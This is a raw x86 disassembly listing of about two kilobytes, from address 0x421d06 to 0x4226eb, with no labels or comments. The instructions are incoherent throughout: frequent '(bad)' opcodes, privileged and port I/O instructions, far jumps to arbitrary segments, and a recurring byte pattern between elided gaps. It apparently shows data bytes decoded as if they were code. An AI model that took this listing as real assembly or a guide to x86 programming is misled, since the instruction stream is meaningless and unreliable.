  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	rcr    DWORD PTR [esi],1
  421d0e:	mov    ebp,0x4ab0859b
  421d13:	add    esp,DWORD PTR [ebx]
  421d15:	pop    edx
  421d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d17:	xchg   edi,eax
  421d18:	push   0xe7013f0d
  421d1d:	sub    al,0xad
  421d1f:	inc    ebx
  421d20:	push   cs
  421d21:	inc    eax
  421d22:	sub    al,0x5
  421d24:	sub    al,0x11
  421d26:	push   edi
  421d27:	and    eax,0xde4f86ec
  421d2c:	push   eax
  421d2d:	mov    ah,0x99
  421d2f:	and    DWORD PTR [ecx+esi*1],0x21
  421d33:	mov    BYTE PTR [edx+0x37],0xb4
  421d37:	mov    ebp,0x26b0f246
  421d3c:	aam    0xa2
  421d3e:	cmp    al,0x35
  421d40:	retf   0xee3d
  421d43:	and    ah,dl
  421d45:	test   edi,0x53ed35c7
  421d4b:	or     eax,0x764dd2ba
  421d50:	or     al,0xcf
  421d52:	jmp    0xb531:0x8ebe2e1
  421d59:	xor    DWORD PTR [eax],eax
  421d5b:	mov    dl,0xe
  421d5d:	push   0xb32c49d1
  421d62:	inc    esi
  421d63:	mov    ah,0x59
  421d65:	aas    
  421d66:	scas   al,BYTE PTR es:[edi]
  421d67:	inc    edi
  421d68:	loopne 0x421d03
  421d6a:	fimul  DWORD PTR [eax-0x4d131ff2]
  421d70:	push   cs
  421d71:	add    eax,0xb8d0c51d
  421d76:	mov    BYTE PTR ds:0xcbfe6d25,ah
  421d7c:	lods   eax,DWORD PTR ds:[esi]
  421d7d:	push   esp
  421d7e:	pop    ss
  421d7f:	dec    edx
  421d80:	or     esi,DWORD PTR [ecx+0xed50a64]
  421d86:	std    
  421d87:	btc    edx,0x37
  421d8b:	xchg   esp,eax
  421d8c:	sub    ecx,ebp
  421d8e:	sub    eax,0xe150835b
  421d93:	(bad)  
  421d94:	daa    
  421d95:	adc    dh,BYTE PTR [edx]
  421d97:	cwde   
  421d98:	int    0xa6
  421d9a:	adc    DWORD PTR [ecx-0x7dec71d8],0x30d6fe2f
  421da4:	lods   eax,DWORD PTR ds:[esi]
  421da5:	adc    al,0xa8
  421da7:	adc    eax,0xeb1d644
  421dac:	inc    esi
  421dad:	cmp    BYTE PTR [ebx+0x17c8a9b3],bl
  421db3:	pusha  
  421db4:	and    eax,0x4a8e4e52
  421db9:	leave  
  421dba:	pop    es
  421dbb:	out    0x88,al
  421dbd:	xchg   ebp,eax
  421dbe:	jbe    0x421d52
  421dc0:	adc    bh,cl
  421dc2:	mov    ds:0xe950266f,al
  421dc7:	push   eax
  421dc8:	std    
  421dc9:	pop    ebp
  421dca:	mov    al,BYTE PTR [ebx-0x29]
  421dcd:	dec    eax
  421dce:	aam    0xab
  421dd0:	retf   
  421dd1:	ds (bad) 
  421dd3:	mov    WORD PTR [ecx],ss
  421dd5:	jmp    0xbb88c134
  421dda:	arpl   WORD PTR [edx+0x1c199dfa],bp
  421de0:	dec    ecx
  421de1:	sar    DWORD PTR [ecx+0x7ffde93c],0xac
  421de8:	inc    ebx
  421de9:	call   0x9c3b3a73
  421dee:	test   edx,ebx
  421df0:	stos   DWORD PTR es:[edi],eax
  421df1:	scas   eax,DWORD PTR es:[edi]
  421df2:	cmp    al,BYTE PTR [ebp-0x269fd7e7]
  421df8:	jno    0x421dc8
  421dfa:	call   0xfbb:0x23feaa97
  421e01:	mov    ebx,0x6e71d84d
  421e06:	shl    DWORD PTR [esi],1
  421e08:	addr16 sti 
  421e0a:	idiv   ebp
  421e0c:	mov    edx,0xe6716f
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	gs out 0x35,al
  421e83:	xor    eax,0x16930
  421e88:	add    al,0x1
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	jg     0x421e45
  421e8e:	pop    ecx
  421e8f:	sub    dh,dh
  421e91:	inc    edx
  421e92:	inc    ebx
  421e93:	and    BYTE PTR [eax+0x0],al
  421e96:	add    eax,DWORD PTR [ecx-0x72]
  421e99:	arpl   WORD PTR [edi],sp
  421e9b:	popa   
  421e9c:	dec    ebx
  421e9d:	lea    esp,ss:[esp+edi*8]
  421ea1:	inc    ax
  421ea3:	out    dx,al
  421ea4:	fisttp DWORD PTR [edi]
  421ea6:	pop    ecx
  421ea7:	pop    eax
  421ea8:	in     al,dx
  421ea9:	jge    0x421e70
  421eab:	arpl   WORD PTR [eax+edi*2-0x7313c5f6],dx
  421eb2:	aas    
  421eb3:	dec    ebx
  421eb4:	js     0x421eb9
  421eb6:	push   edi
  421eb7:	iret   
  421eb8:	pop    edx
  421eb9:	xor    BYTE PTR [ebx+0x6f],ch
  421ebc:	int    0x5
  421ebe:	adc    bh,BYTE PTR [ebx+0x5c3ba82]
  421ec4:	test   DWORD PTR [ebx],esi
  421ec6:	test   al,0x8a
  421ec8:	js     0x421f08
  421eca:	pop    ecx
  421ecb:	push   edi
  421ecc:	fs mov ebp,0x699fd4bd
  421ed2:	jp     0x421f36
  421ed4:	push   ds
  421ed5:	in     al,dx
  421ed6:	adc    ebp,DWORD PTR [edi+0x64832d7d]
  421edc:	xchg   edi,eax
  421edd:	test   bl,ah
  421edf:	push   es
  421ee0:	mov    eax,0xd52d4a01
  421ee5:	lods   eax,DWORD PTR ds:[esi]
  421ee6:	dec    ebx
  421ee7:	pop    edx
  421ee8:	mov    ah,bl
  421eea:	push   ds
  421eeb:	jp     0x421f0c
  421eed:	or     eax,0xf1e011f1
  421ef2:	mov    eax,ds:0xcaab0f4a
  421ef7:	or     ah,dl
  421ef9:	cmc    
  421efa:	dec    esp
  421efb:	push   0xa62608e8
  421f00:	das    
  421f01:	push   esi
  421f02:	mov    ds:0x85e7dfb3,eax
  421f07:	add    edi,DWORD PTR ds:[ecx+0x3c302d8c]
  421f0e:	jbe    0x421e91
  421f10:	jmp    0x3edb8525
  421f15:	hlt    
  421f16:	mov    eax,cr0
  421f19:	je     0x421f84
  421f1b:	cld    
  421f1c:	jo     0x421f12
  421f1e:	enter  0x246c,0xe5
  421f22:	fld    TBYTE PTR [ecx]
  421f24:	push   edi
  421f25:	ret    
  421f26:	sbb    cl,BYTE PTR [eax]
  421f28:	mov    edx,0x6a67242d
  421f2d:	sub    ecx,ecx
  421f2f:	ja     0x421f93
  421f31:	push   cs
  421f32:	inc    ebp
  421f33:	imul   edi,esi,0xf12bebd3
  421f39:	pushf  
  421f3a:	into   
  421f3b:	cwde   
  421f3c:	push   ebp
  421f3d:	arpl   WORD PTR [edx-0x6030e8d2],sp
  421f43:	adc    bh,BYTE PTR ds:0x388504cd
  421f49:	fld    st(4)
  421f4b:	idiv   DWORD PTR [ecx-0x18c21506]
  421f51:	call   ebp
  421f53:	retf   0xc5ba
  421f56:	push   ds
  421f57:	pusha  
  421f58:	pop    es
  421f59:	jp     0x421fc7
  421f5b:	add    bh,BYTE PTR ds:0x938ac002
  421f61:	in     al,dx
  421f62:	inc    edi
  421f63:	out    0x56,al
  421f65:	into   
  421f66:	sub    ah,BYTE PTR [esi-0x1c1aa39e]
  421f6c:	in     eax,dx
  421f6d:	test   BYTE PTR [ebx],ch
  421f6f:	loop   0x421f70
  421f71:	and    al,0x8d
  421f73:	pushf  
  421f74:	test   eax,0x58630391
  421f79:	(bad)  
  421f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f7b:	or     dl,dh
  421f7d:	xchg   edi,eax
  421f7e:	jle    0x421f72
  421f80:	loopne 0x421f90
  421f82:	fimul  WORD PTR [edx+0x611c8af2]
  421f88:	ret    0xbaeb
  421f8b:	push   esp
  421f8c:	jbe    0x421f75
  421f8e:	dec    ebp
  421f8f:	xor    BYTE PTR [eax],al
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	mov    ax,ds:0x3435e71f
  422005:	push   0x1
  422007:	add    BYTE PTR [ecx+eax*1],al
  42200a:	add    BYTE PTR [eax],al
  42200c:	push   edx
  42200d:	iret   
  42200e:	sahf   
  42200f:	sti    
  422010:	in     al,dx
  422011:	dec    ebp
  422012:	dec    ebx
  422013:	or     BYTE PTR [ebp-0x5],al
  422016:	or     al,0xff
  422018:	cmp    ecx,ecx
  42201a:	jnp    0x422077
  42201c:	xchg   DWORD PTR ds:0x9f11de6c,esi
  422022:	or     bh,BYTE PTR [eax]
  422024:	cmp    eax,0xbef83b2d
  422029:	int3   
  42202a:	mov    cl,0xc8
  42202c:	aad    0x52
  42202e:	int    0x79
  422030:	stos   DWORD PTR es:[edi],eax
  422031:	jb     0x422071
  422033:	das    
  422034:	push   esi
  422035:	cmp    DWORD PTR [esi],esp
  422037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422038:	jge    0x42206c
  42203a:	push   ebx
  42203b:	(bad)  
  42203c:	test   eax,0xce67f10e
  422041:	dec    esi
  422042:	mov    ds:0xf57e1704,eax
  422047:	and    eax,0xe86b5059
  42204c:	cli    
  42204d:	retf   0x5f18
  422050:	out    dx,eax
  422051:	mov    esp,0x7c98ef5c
  422056:	in     eax,dx
  422057:	stos   BYTE PTR es:[edi],al
  422058:	lods   al,BYTE PTR ds:[esi]
  422059:	test   ah,al
  42205b:	loop   0x421fe3
  42205d:	arpl   bp,bp
  42205f:	jmp    0x6a4a4ac0
  422064:	inc    eax
  422065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422066:	fild   QWORD PTR [ebx-0x54]
  422069:	add    ebx,DWORD PTR [esi]
  42206b:	arpl   WORD PTR [edx-0x5fef0ea3],dx
  422071:	ret    0x98f7
  422074:	es xor edx,edi
  422077:	call   0xa2e5:0xb1757417
  42207e:	int3   
  42207f:	arpl   WORD PTR [eax+0x756f131e],ax
  422085:	cmc    
  422086:	dec    ecx
  422087:	jge    0x422094
  422089:	ds adc ah,bl
  42208c:	sbb    bl,cl
  42208e:	int3   
  42208f:	add    ecx,DWORD PTR [edx-0x73eb4588]
  422095:	pop    ss
  422096:	pop    ds
  422097:	nop
  422098:	sub    DWORD PTR [edi-0xb3cdfb9],eax
  42209e:	imul   ecx,ecx,0x9d6487e7
  4220a4:	and    eax,0x971860c4
  4220a9:	ret    
  4220aa:	mov    ebx,0xa198c586
  4220af:	or     dl,BYTE PTR [ecx+0x77]
  4220b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220b3:	fadd   st,st(7)
  4220b5:	push   ebp
  4220b6:	mov    bl,0x38
  4220b8:	jle    0x42207e
  4220ba:	xchg   edx,eax
  4220bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220bc:	stos   BYTE PTR es:[edi],al
  4220bd:	and    dh,BYTE PTR [edi+0x10]
  4220c0:	stos   DWORD PTR es:[edi],eax
  4220c1:	(bad)  
  4220c2:	in     eax,0x96
  4220c4:	ins    DWORD PTR es:[edi],dx
  4220c5:	inc    esi
  4220c6:	xchg   edi,eax
  4220c7:	mov    al,ds:0x2fea0141
  4220cc:	fcomp  QWORD PTR [ebp+0x126ab5cc]
  4220d2:	mov    dl,0x2e
  4220d4:	(bad)  
  4220d5:	fisubr WORD PTR [esi+ebx*1-0x7f]
  4220d9:	dec    esi
  4220da:	out    0x20,al
  4220dc:	xor    edx,DWORD PTR [edi+0x1d114df1]
  4220e2:	mov    cl,0x11
  4220e4:	nop
  4220e5:	xor    BYTE PTR [ecx-0x3abb6145],bh
  4220eb:	mov    cl,0xd6
  4220ed:	rol    BYTE PTR [edi+0x19],cl
  4220f0:	inc    edx
  4220f1:	ins    BYTE PTR es:[edi],dx
  4220f2:	setnp  BYTE PTR [ecx+0x31]
  4220f6:	aas    
  4220f7:	push   es
  4220f8:	and    bh,0xa7
  4220fb:	sti    
  4220fc:	(bad)
  422100:	ins    BYTE PTR es:[edi],dx
  422101:	pop    es
  422102:	mov    ebp,0x3bd8fcbe
  422107:	pop    edi
  422108:	stc    
  422109:	mov    ebx,0x27549520
  42210e:	mov    ch,0x72
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,edx
  422181:	loopne 0x422135
  422183:	jge    0x4221bd
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    al,0x1
  42218a:	add    BYTE PTR [eax],al
  42218c:	cld    
  42218d:	pop    ecx
  42218e:	or     BYTE PTR [edx],bl
  422190:	xor    eax,0xa427249a
  422195:	push   esp
  422196:	and    ch,BYTE PTR [eax+ecx*1]
  422199:	adc    esp,esp
  42219b:	rcr    DWORD PTR [eax-0x3b],0x17
  42219f:	fistp  QWORD PTR [eax+0x6b353a9d]
  4221a5:	into   
  4221a6:	fld    QWORD PTR [ebx+0x0]
  4221a9:	repz mov dh,0xef
  4221ac:	and    eax,0x42a13606
  4221b1:	jno    0x42222f
  4221b3:	aas    
  4221b4:	(bad)  
  4221b5:	jne    0x4221b7
  4221b7:	inc    esp
  4221b8:	add    ah,BYTE PTR [edi+edx*1+0x5c]
  4221bc:	push   esi
  4221bd:	dec    ecx
  4221be:	lods   eax,DWORD PTR ds:[esi]
  4221bf:	push   0xffffffe1
  4221c1:	add    DWORD PTR [edi],esp
  4221c3:	cmp    BYTE PTR [ecx+esi*4],ah
  4221c6:	mov    ah,0x10
  4221c8:	xor    cl,BYTE PTR [edi-0x4d9e86d6]
  4221ce:	data16 sbb al,0xea
  4221d1:	cmc    
  4221d2:	mov    dh,0xca
  4221d4:	sub    dh,BYTE PTR [edx+0x18]
  4221d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d8:	ret    0x4ad0
  4221db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221dc:	xor    eax,0x51a75c52
  4221e1:	adc    eax,0x33c52a03
  4221e6:	rcl    BYTE PTR [edx+ebp*8+0x4ae800d8],cl
  4221ed:	int    0xa8
  4221ef:	pop    eax
  4221f0:	scas   al,BYTE PTR es:[edi]
  4221f1:	push   edi
  4221f2:	add    ch,BYTE PTR [ebp+0x3c9c507f]
  4221f8:	or     BYTE PTR [edx+0x454d840c],dl
  4221fe:	jne    0x4221aa
  422200:	mov    edi,0xe895ee96
  422205:	and    BYTE PTR [ebx+0x0],ah
  422208:	mov    ebp,0xf79d9c6d
  42220d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42220e:	mov    dl,0xf1
  422210:	ror    DWORD PTR [eax+0x63c7fc85],0x9e
  422217:	sbb    DWORD PTR [bp+di+0x346d],esp
  42221c:	push   edi
  42221d:	loopne 0x422219
  42221f:	cmp    dl,ah
  422221:	and    ch,dh
  422223:	pop    es
  422224:	cld    
  422225:	xor    bh,ah
  422227:	mov    bl,0x25
  422229:	clc    
  42222a:	cmp    ebx,DWORD PTR [edi]
  42222c:	out    0x23,al
  42222e:	jo     0x42227b
  422230:	(bad)  
  422231:	cmp    eax,0x16c30b43
  422236:	aam    0xed
  422238:	xor    ebp,edx
  42223a:	icebp  
  42223b:	lds    edi,FWORD PTR ds:0xd4517fed
  422241:	sahf   
  422242:	and    DWORD PTR [ebp-0x30],ecx
  422245:	xchg   DWORD PTR [esi+0x6c],eax
  422248:	or     esp,esp
  42224a:	nop
  42224b:	push   esi
  42224c:	das    
  42224d:	icebp  
  42224e:	loop   0x4221fc
  422250:	jb     0x422243
  422252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422253:	mov    cl,0xf4
  422255:	(bad)  
  422256:	mov    eax,0x2a2ac7cc
  42225b:	pop    ebx
  42225c:	loop   0x4222db
  42225e:	jmp    0xd94b327b
  422263:	repz jno 0x4221ee
  422266:	int    0xef
  422268:	cmp    eax,0xcedf21ba
  42226d:	sbb    bh,BYTE PTR [edx-0x4c]
  422270:	push   0x44
  422272:	adc    BYTE PTR [esi],cl
  422274:	mov    ebp,0x516ed90e
  422279:	or     esi,DWORD PTR [edx+0xa]
  42227c:	or     eax,0xf9de1e8d
  422281:	dec    ecx
  422282:	mov    eax,ds:0x538425cc
  422287:	inc    edi
  422288:	mov    ebp,0x105bbf1f
  42228d:	dec    eax
  42228e:	div    DWORD PTR [edx]
	...
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	add    al,0x2c
  422302:	and    bl,BYTE PTR [ecx+0x16c3c]
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	(bad)  
  42230d:	push   edx
  42230e:	mov    cs,WORD PTR [esi-0x6c]
  422311:	push   ss
  422312:	sbb    al,0x76
  422314:	adc    eax,0xce034f0f
  422319:	xchg   esi,eax
  42231a:	push   edi
  42231b:	jl     0x4222ad
  42231d:	out    dx,eax
  42231e:	das    
  42231f:	cmp    BYTE PTR [edi+0x7a],0xd9
  422323:	sbb    al,0x6
  422325:	mov    WORD PTR [edi-0x50],?
  422328:	cld    
  422329:	aam    0x7d
  42232b:	pop    ebx
  42232c:	dec    edi
  42232d:	in     eax,0x99
  42232f:	pushf  
  422330:	out    0x29,eax
  422332:	push   ebx
  422333:	sti    
  422334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422335:	add    eax,0x9705e18a
  42233a:	pop    ds
  42233b:	sbb    al,0xe9
  42233d:	xor    esi,DWORD PTR [edi+0xebbe7ab]
  422343:	popa   
  422344:	pop    ss
  422345:	dec    edx
  422346:	push   ecx
  422347:	mov    esp,0x46ee80a2
  42234c:	jmp    0x6f0737b
  422351:	jo     0x422365
  422353:	cmp    ebx,ebp
  422355:	fisubr WORD PTR [ebx]
  422357:	test   eax,0x332af606
  42235c:	pop    ss
  42235d:	adc    al,0x51
  42235f:	pop    edi
  422360:	xor    ecx,DWORD PTR [esi-0x78]
  422363:	jp     0x422316
  422365:	dec    esi
  422366:	push   DWORD PTR [esi+eax*4+0x1e]
  42236a:	ret    
  42236b:	clc    
  42236c:	pushf  
  42236d:	out    dx,eax
  42236e:	aad    0x70
  422370:	add    eax,DWORD PTR [edi-0x8]
  422373:	rol    DWORD PTR ds:0xfcb6673e,0x79
  42237a:	popa   
  42237b:	fiadd  WORD PTR [ebp-0x308400a4]
  422381:	xchg   esp,eax
  422382:	in     al,dx
  422383:	enter  0x118b,0xb6
  422387:	shr    BYTE PTR [esi-0x25280b7e],0x44
  42238e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42238f:	outs   dx,DWORD PTR ds:[esi]
  422390:	(bad)  
  422391:	fwait
  422392:	arpl   bx,bp
  422394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422395:	or     dh,dl
  422397:	scas   al,BYTE PTR es:[edi]
  422398:	or     al,0x1c
  42239a:	adc    BYTE PTR [eax+0x3d],0x4f
  42239e:	ror    BYTE PTR [esi+0x1ee79286],0x9a
  4223a5:	mov    esp,0xcfc04478
  4223aa:	cmp    DWORD PTR [edx+ebp*2],esi
  4223ad:	enter  0xdb0d,0x3b
  4223b1:	(bad)  
  4223b2:	cdq    
  4223b3:	outs   dx,DWORD PTR ds:[esi]
  4223b4:	lods   al,BYTE PTR ds:[esi]
  4223b5:	add    al,0x94
  4223b8:	cmc    
  4223b9:	or     ah,BYTE PTR [ecx+0x85b8107]
  4223bf:	std    
  4223c0:	loope  0x42237a
  4223c2:	ins    DWORD PTR es:[edi],dx
  4223c3:	ds repnz mov ss,ebp
  4223c7:	les    edi,FWORD PTR [eax-0x543d1734]
  4223cd:	mov    bl,0xbb
  4223cf:	mov    al,ds:0xd71d236e
  4223d4:	fdiv   QWORD PTR [edi+0x62e3eb1d]
  4223da:	stos   BYTE PTR es:[edi],al
  4223db:	in     al,dx
  4223dc:	pop    ecx
  4223dd:	js     0x4223ac
  4223df:	mov    bl,0x94
  4223e1:	lds    ebp,FWORD PTR [ebp+0x784c2f21]
  4223e7:	inc    esi
  4223e8:	adc    BYTE PTR [eax],bl
  4223ea:	out    0xf5,eax
  4223ec:	daa    
  4223ed:	ret    
  4223ee:	dec    edi
  4223ef:	mov    esp,0x9ffe43d0
  4223f4:	lahf   
  4223f5:	sbb    dl,BYTE PTR ds:0x259bd514
  4223fb:	and    ch,bl
  4223fd:	mov    bh,0xbc
  4223ff:	shr    BYTE PTR [esi+edx*1-0x1e],1
  422403:	sbb    eax,0x2609b7be
  422408:	fadd   QWORD PTR [ebx]
  42240a:	fucomp st(7)
  42240c:	int    0xaf
  42240e:	outs   dx,DWORD PTR ds:[esi]
  42240f:	inc    esp
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	pop    ds
  422481:	sbb    eax,0x6d40710e
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	dec    ebx
  42248d:	into   
  42248e:	pop    eax
  42248f:	lds    ebx,FWORD PTR [ebx+0x24]
  422492:	dec    edx
  422493:	xor    BYTE PTR [ebx+0x7a],0x5f
  422497:	pop    eax
  422498:	mov    al,0xaa
  42249a:	dec    esi
  42249b:	xchg   ebp,eax
  42249c:	jle    0x422477
  42249e:	dec    ecx
  42249f:	pop    esi
  4224a0:	ins    BYTE PTR es:[edi],dx
  4224a1:	xchg   edi,eax
  4224a2:	jns    0x4224ec
  4224a4:	mov    esi,0xbee21ddc
  4224a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224aa:	or     al,0xf5
  4224ac:	test   DWORD PTR [ecx-0x21],ecx
  4224af:	mov    BYTE PTR [esi],ah
  4224b1:	aad    0x11
  4224b3:	add    eax,esp
  4224b5:	imul   esp,DWORD PTR [eax-0x16],0x7baf1cf8
  4224bc:	and    esi,DWORD PTR [esi+0x6f472cd]
  4224c2:	cmp    DWORD PTR [edi-0x55],esi
  4224c5:	inc    ecx
  4224c6:	imul   edx,DWORD PTR [ebx-0x10],0xffffffca
  4224ca:	das    
  4224cb:	js     0x4224da
  4224cd:	jno    0x422520
  4224cf:	mov    al,ds:0xf2c7af93
  4224d4:	mov    DWORD PTR [edx-0x31],esi
  4224d7:	jg     0x4224a9
  4224d9:	jnp    0x422540
  4224db:	bound  ebp,QWORD PTR [esi+0x5bb11752]
  4224e1:	stos   DWORD PTR es:[edi],eax
  4224e2:	xor    eax,0x19950aa2
  4224e7:	popa   
  4224e8:	repnz bound esp,QWORD PTR [ebp+ebx*2+0x21]
  4224ed:	icebp  
  4224ee:	stos   DWORD PTR es:[edi],eax
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	in     al,dx
  4224f1:	mov    ecx,DWORD PTR [edi-0x67978eb1]
  4224f7:	out    dx,al
  4224f8:	mov    ah,0xb7
  4224fa:	lahf   
  4224fb:	fwait
  4224fc:	inc    edi
  4224fd:	xor    DWORD PTR [esp+edx*1+0x316e81f4],edx
  422504:	mov    esp,0x475e9b29
  422509:	fstp   DWORD PTR [eax]
  42250b:	(bad)
  42250f:	cmove  edx,DWORD PTR [edx+eiz*4+0x34112ed4]
  422517:	mov    ecx,0xec9a825b
  42251c:	cdq    
  42251d:	cmp    ah,BYTE PTR [esi]
  42251f:	(bad)  
  422520:	or     al,0x2d
  422522:	xchg   BYTE PTR [esi+ebp*1],cl
  422525:	mov    WORD PTR [esi],es
  422527:	in     eax,dx
  422528:	les    esp,FWORD PTR [ecx]
  42252a:	xor    edx,ebp
  42252c:	out    0xe5,al
  42252e:	mov    dh,0xde
  422530:	fwait
  422531:	loop   0x422557
  422533:	dec    edx
  422534:	sub    al,0x74
  422536:	mov    dl,BYTE PTR [ecx+0x3a]
  422539:	sbb    ebp,ebp
  42253b:	retf   
  42253c:	xor    al,0x9
  42253e:	std    
  42253f:	xchg   edx,eax
  422540:	lods   eax,DWORD PTR ds:[esi]
  422541:	mov    esp,0x2f13e7da
  422546:	and    BYTE PTR [edi+edi*8+0x55],ah
  42254a:	push   ds
  42254b:	mov    bh,0x85
  42254d:	ins    BYTE PTR es:[edi],dx
  42254e:	pop    eax
  42254f:	xchg   ecx,eax
  422550:	or     al,0x9e
  422552:	or     edx,0xd43cc9a8
  422558:	fs sahf 
  42255a:	imul   ebx,DWORD PTR [esi+edx*2-0x33],0xdb3d11e3
  422562:	cmp    edi,DWORD PTR [esi+0x5a58cd48]
  422568:	scas   eax,DWORD PTR es:[edi]
  422569:	pusha  
  42256a:	fstp   QWORD PTR [ecx+0x31ce119]
  422570:	adc    eax,0xe1a4ea44
  422575:	cmp    ah,bl
  422577:	sbb    cl,BYTE PTR es:[eax]
  42257a:	adc    edx,edx
  42257c:	pop    ebx
  42257d:	xchg   edx,eax
  42257e:	scas   al,BYTE PTR es:[edi]
  42257f:	xlat   BYTE PTR ds:[ebx]
  422580:	mov    eax,0xfdcfaec4
  422585:	and    edx,DWORD PTR [eax+0xd]
  422588:	sub    eax,DWORD PTR [ecx]
  42258a:	lds    ecx,FWORD PTR [edi]
  42258c:	inc    eax
  42258d:	adc    bh,0xc7
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x7eb7a2f8]
  422602:	ds xchg edx,eax
  422604:	inc    esp
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	cwde   
  42260d:	lds    ecx,FWORD PTR [ebx]
  42260f:	dec    esi
  422610:	xor    dl,cl
  422612:	sbb    al,0xc7
  422614:	bound  edx,QWORD PTR [esi]
  422616:	xchg   DWORD PTR [esi+0x73ca2ad1],ecx
  42261c:	push   eax
  42261d:	std    
  42261e:	leave  
  42261f:	call   0xb437:0x5077195c
  422626:	dec    ecx
  422627:	push   0xa97b2dec
  42262c:	ja     0x422607
  42262e:	sub    esi,DWORD PTR [ecx+ebx*2-0x34a1e5c0]
  422635:	push   cs
  422636:	dec    esi
  422637:	out    0xc3,eax
  422639:	icebp  
  42263a:	fwait
  42263b:	add    dh,dh
  42263d:	jns    0x422654
  42263f:	xor    eax,DWORD PTR [ecx+0x26]
  422642:	dec    ebx
  422643:	ffreep st(3)
  422645:	pop    ss
  422646:	or     ebx,DWORD PTR [ebx-0x45]
  422649:	mov    dh,ch
  42264b:	loop   0x4226a3
  42264d:	fucomp st(1)
  42264f:	out    0x3c,al
  422651:	aam    0xe8
  422653:	dec    ebx
  422654:	inc    eax
  422655:	xor    BYTE PTR [eax+0x3f],bh
  422658:	js     0x4225e4
  42265a:	js     0x422631
  42265c:	add    eax,0xc3c8cc68
  422661:	(bad)  
  422662:	(bad)  
  422664:	iret   
  422665:	cmp    dl,ah
  422667:	call   0x6463:0x77bef6ae
  42266e:	cmp    BYTE PTR [edi+0x7bfa37ef],0xbc
  422675:	and    ah,BYTE PTR [edi-0x4156fbd6]
  42267b:	int    0x5c
  42267d:	or     WORD PTR [ebx-0x6c],bp
  422681:	jp     0x422679
  422683:	jmp    0x4226fa
  422685:	mov    eax,ds:0x84a360be
  42268a:	psraw  mm2,QWORD PTR [edi-0x5fa7f426]
  422691:	mov    al,ds:0xc978b2fe
  422696:	dec    esi
  422697:	outs   dx,BYTE PTR ds:[esi]
  422698:	daa    
  422699:	loop   0x4226c7
  42269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42269c:	jg     0x4226a8
  42269e:	sub    al,BYTE PTR [edi+0x6e834e6d]
  4226a4:	dec    edi
  4226a5:	out    0x20,al
  4226a7:	scas   al,BYTE PTR es:[edi]
  4226a8:	mov    WORD PTR [esi+0x63],?
  4226ab:	dec    eax
  4226ac:	mov    edi,0x11ab5497
  4226b1:	outs   dx,DWORD PTR ds:[esi]
  4226b2:	pop    edi
  4226b3:	fadd   st,st(4)
  4226b5:	popf   
  4226b6:	not    DWORD PTR [esi]
  4226b8:	jns    0x422702
  4226ba:	test   BYTE PTR [ebx+eiz*8],bh
  4226bd:	jp     0x422683
  4226bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226c0:	inc    esp
  4226c1:	(bad)  
  4226c3:	push   ebx
  4226c4:	loopne 0x42270f
  4226c6:	imul   esi,DWORD PTR [esi+0x1a71e35f],0x52
  4226cd:	sbb    ah,bl
  4226cf:	in     eax,dx
  4226d0:	sbb    BYTE PTR [edi+esi*1],dl
  4226d3:	and    ch,BYTE PTR [ebx]
  4226d5:	jno    0x422754
  4226d7:	xchg   esi,eax
  4226d8:	or     BYTE PTR [edi],bl
  4226da:	pushf  
  4226db:	popf   
  4226dc:	inc    DWORD PTR [eax-0x1]
  4226df:	mov    ebx,0x7af0752e
  4226e4:	mov    eax,0x60c9b6f1
  4226e9:	xchg   esp,eax
  4226ea:	pop    esp
  4226eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
